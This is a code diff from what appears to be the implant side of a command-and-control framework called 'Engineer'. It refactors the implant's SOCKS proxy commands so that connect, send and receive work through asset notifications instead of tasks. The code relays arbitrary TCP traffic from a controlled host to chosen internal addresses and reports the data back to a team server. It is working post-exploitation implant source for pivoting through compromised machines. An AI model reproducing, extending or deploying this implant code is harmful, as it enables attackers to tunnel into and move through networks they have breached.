@@ -36,39 +36,40 @@ namespace Engineer.Commands
             ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"socks started on team server at port {port}", task, EngTaskStatus.Running,TaskResponseType.String);
         }
     }
-    internal class socksConnect : EngineerCommand
+    internal class socksConnect 
     {
-        public override string Name => "socksConnect";
-        public override bool IsHidden => true;
-
-        public override async Task Execute(EngineerTask task)
+        public string Name => "socksConnect";
+        public static async Task Execute(AssetNotification sockNotif)
         {
             try
             {
                 //try to get the values for /Address and /Port from the task.arguments dictionary convert the address to an IpAddress object and the port to an int
-                task.Arguments.TryGetValue("/Address", out var address);
-                task.Arguments.TryGetValue("/Port", out var port);
-                task.Arguments.TryGetValue("/Client", out var client);
+                sockNotif.NotificationData.TryGetValue("/Address", out var address_data);
+                sockNotif.NotificationData.TryGetValue("/Port", out var port_data);
+                sockNotif.NotificationData.TryGetValue("/Client", out var client_data);
+                string address = address_data.JsonDeserialize<string>();
+                int port = port_data.JsonDeserialize<int>();
+                string client = client_data.JsonDeserialize<string>();
                 socks.SocksClients.Add(client);
                 socks.SocksClientsData.TryAdd(client, new ConcurrentQueue<byte[]>());
                 //Console.WriteLine($"Connecting to {address}:{port}");
 
-                Task.Run(async () => await ConnectSocks(address, port, client));
-                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Connecting to {address}:{port}" + $"\n{client}", task, EngTaskStatus.Complete,TaskResponseType.String);
+                await ConnectSocks(address, port, client,sockNotif.AssetId);
+               // ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Connecting to {address}:{port}" + $"\n{client}", task, EngTaskStatus.Complete,TaskResponseType.String);
             }
             
             catch(Exception e)
             {
                 //Console.WriteLine(e.Message);
                 //Console.WriteLine(e.StackTrace);
-                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error with socks connect", task, EngTaskStatus.Failed,TaskResponseType.String);
+               // ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error with socks connect", task, EngTaskStatus.Failed,TaskResponseType.String);
             }
         }
         
-        private async Task ConnectSocks(string address, string port,string client)
+        private static async Task ConnectSocks(string address, int port, string client,string assetId)
         {
             var ipAddress = IPAddress.Parse(address);
-            var portInt = int.Parse(port);
+            var portInt = port;
             // connect to destination
             var destination = new TcpClient();
             destination.ReceiveBufferSize = socks.TrafficSize;
@@ -77,94 +78,30 @@ namespace Engineer.Commands
             try
             {               
                 await destination.ConnectAsync(ipAddress, portInt);
-                //Stopwatch Clientstopwatch = new Stopwatch();
-                //decimal ClientDataSentPerSecond = 0;
-                //decimal ClientnumberOfSendsPerSecond = 0;
-
-                //Stopwatch Deststopwatch = new Stopwatch();
-                //decimal DestDataSentPerSecond = 0;
-                //decimal DestnumberOfSendsPerSecond = 0;
-
-                //Console.WriteLine($"Connected to {ipAddress}:{portInt}");
+                Dictionary<string, byte[]> connectnotifdata = new()
+                {
+                    {"/client", client.JsonSerialize() }
+                };
+                await Tasking.CreateOutboundNotif(assetId,"socksConnect", connectnotifdata, false);
                 while (!socks._tokenSource.IsCancellationRequested)
                 {
                     // send to destination
                     if (!socks.SocksClientsData[client].IsEmpty)
                     {
                         socks.SocksClientsData[client].TryDequeue(out var data);
-                        //start the stopwatch if it is not already running, every 10 seconds that data is sent increment the DataSentPerSecond variable,
-                        //print the amount of data in bytes sent per second and reset the stopwatch and DataSentPerSecond variables
-                        //if (!Clientstopwatch.IsRunning)
-                        //{
-                        //    Clientstopwatch.Start();
-                        //}
-                        //ClientDataSentPerSecond += data.Length;
-                        //ClientnumberOfSendsPerSecond++;
-                        //if (Clientstopwatch.ElapsedMilliseconds >= 10000)
-                        //{
-                        //    //should only print every 10 seconds so we dont spam the console
-                        //    Console.WriteLine($"Data sent to client end per second: {ClientDataSentPerSecond / 10}");
-                        //    Console.WriteLine($"Number of sends to client end per second: {ClientnumberOfSendsPerSecond / 10}");
-                        //    ClientDataSentPerSecond = 0;
-                        //    ClientnumberOfSendsPerSecond = 0;
-                        //    Clientstopwatch.Reset();
-                        //}
-                        //Console.WriteLine($"Engineer sending client {client} {data.Length} bytes");
                         await destination.SendData(data, socks._tokenSource.Token);
                     }
                     // read from destination
                     if (destination.DataAvailable())
                     {
                         var resp = await destination.ReceiveData(socks._tokenSource.Token);
-                        //if (!Deststopwatch.IsRunning)
-                        //{
-                        //    Deststopwatch.Start();
-                        //}
-                        //DestDataSentPerSecond += resp.Length;
-                        //DestnumberOfSendsPerSecond++;
-                        //if (Deststopwatch.ElapsedMilliseconds >= 10000)
-                        //{
-                        //    //should only print every 10 seconds so we dont spam the console
-                        //    Console.WriteLine($"Data obtained from client end per second: {DestDataSentPerSecond / 10}");
-                        //    Console.WriteLine($"Number of sends obtained from client end per second: {DestnumberOfSendsPerSecond / 10}");
-                        //    DestDataSentPerSecond = 0;
-                        //    DestnumberOfSendsPerSecond = 0;
-                        //    Deststopwatch.Reset();
-                        //}
-                        //make a new engineer task with the argument /data which is resp converted to a base64 string and then add the task to the queue
-                        //var task = new EngineerTask
-                        //{
-                        //    Id = Guid.NewGuid().ToString(),
-                        //    Command = "socksReceive",
-                        //    File = resp,
-                        //    Arguments = new Dictionary<string, string>
-                        //{
-                        //    {"/client",client }
-                        //}
-                        //};
-                        //Task.Run(async() => await Tasking.DealWithTask(task));
 
-                        //testing replacing the above internal task with just making a task result directly 
-                        //this should work because the item is already a byte[] so i dont need the fill result json serialization stuff
-                        Task.Run(() => 
+                        Dictionary<string, byte[]> recvnotifdata = new()
                         {
-                            var newTaskResult = new EngineerTaskResult
-                            {
-                                Id = Guid.NewGuid().ToString(),
-                                Command = "socksReceive",
-                                IsHidden = true,
-                                ImplantId = Program._metadata.Id,
-                                ResponseType = TaskResponseType.None,
-                                Status = EngTaskStatus.Complete
-                            };
-
-                            var sockContent = resp;
-                            byte[] sockClient = client.JsonSerialize();
-                            byte[] socks_client_length = BitConverter.GetBytes(sockClient.Length);
-                            byte[] finalSocksRec_content = socks_client_length.Concat(sockClient).Concat(sockContent).ToArray();
-                            newTaskResult.Result = finalSocksRec_content;
-                            Program._commModule.Outbound.Enqueue(newTaskResult);
-                        });
+                            {"/client", client.JsonSerialize() },
+                            {"/data",resp },
+                        };
+                        await Tasking.CreateOutboundNotif(assetId, "socksReceive", recvnotifdata, false);
                     }
                     // rip cpu
                     await Task.Delay(1);
@@ -178,41 +115,18 @@ namespace Engineer.Commands
         }
     }
     
-    internal class SocksSend : EngineerCommand
+    internal class SocksSend
     {
-        public override string Name => "socksSend";
-        public override bool IsHidden => true;
-
-        public override async Task Execute(EngineerTask task)
+        public string Name => "SocksSend";
+        public static async Task Execute(AssetNotification notif)
         {
-            task.Arguments.TryGetValue("/client", out var client);
-
-            //while the socks client is waiting for data to be sent do not send the data 
-            var req = task.File;
+            notif.NotificationData.TryGetValue("/client", out var clientId_array);
+            notif.NotificationData.TryGetValue("/data", out var req);
+            string client = clientId_array.JsonDeserialize<string>();
             socks.SocksClientsData[client].Enqueue(req);
-            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("", task, EngTaskStatus.Complete,TaskResponseType.None);
         }
     }
     
-    //internal class SocksReceive : EngineerCommand
-    //{
-    //    public override string Name => "socksReceive";
-    //    public override bool IsHidden => true;
-
-    //    public override async Task Execute(EngineerTask task)
-    //    {
-    //        // trygetvalue of task.arguments /data and return that value
-    //        var sockContent = task.File;
-    //        //set task.FIle to null otherwise we are sending the data in the task object and the result string 
-    //        task.Arguments.TryGetValue("/client", out var client);
-    //        byte[] sockClient = client.JsonSerialize();
-    //        byte[] socks_client_length = BitConverter.GetBytes(sockClient.Length);
-    //        task.File = null;
-    //        byte[] finalSocksRec_content = socks_client_length.Concat(sockClient).Concat(sockContent).ToArray();
-
-    //       ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(finalSocksRec_content, task, EngTaskStatus.Complete, TaskResponseType.None);
-    //    }
-    //}
 
     internal static class Extensions
     {
